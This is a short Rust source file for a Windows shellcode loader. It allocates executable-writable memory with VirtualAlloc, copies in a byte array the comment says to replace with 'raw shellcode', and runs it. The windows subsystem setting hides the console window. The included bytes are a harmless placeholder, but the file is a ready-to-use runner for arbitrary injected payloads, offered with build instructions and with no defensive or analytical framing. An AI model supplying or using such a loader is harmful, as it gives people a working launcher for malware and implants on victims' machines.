// Minimal Rust x64 Windows loader. Compile with:
//   rustup target add x86_64-pc-windows-msvc
//   cargo build --target x86_64-pc-windows-msvc --release
// (or use the gnu toolchain for mingw).
#![cfg(windows)]
#![windows_subsystem = "windows"]

// Paste the raw shellcode bytes here.
const PAYLOAD: &[u8] = &[0x90, 0x90, 0xcc];

fn main() {
    unsafe {
        let ptr = kernel32::VirtualAlloc(
            std::ptr::null_mut(),
            PAYLOAD.len(),
            0x3000,      // MEM_COMMIT | MEM_RESERVE
            0x40,        // PAGE_EXECUTE_READWRITE
        );
        if ptr.is_null() {
            return;
        }
        std::ptr::copy_nonoverlapping(PAYLOAD.as_ptr(), ptr as *mut u8, PAYLOAD.len());
        let f: extern "C" fn() = std::mem::transmute(ptr);
        f();
    }
}

#[allow(non_snake_case)]
mod kernel32 {
    #[link(name = "kernel32")]
    extern "system" {
        pub fn VirtualAlloc(
            lp: *mut core::ffi::c_void,
            size: usize,
            alloc_type: u32,
            protect: u32,
        ) -> *mut core::ffi::c_void;
    }
}
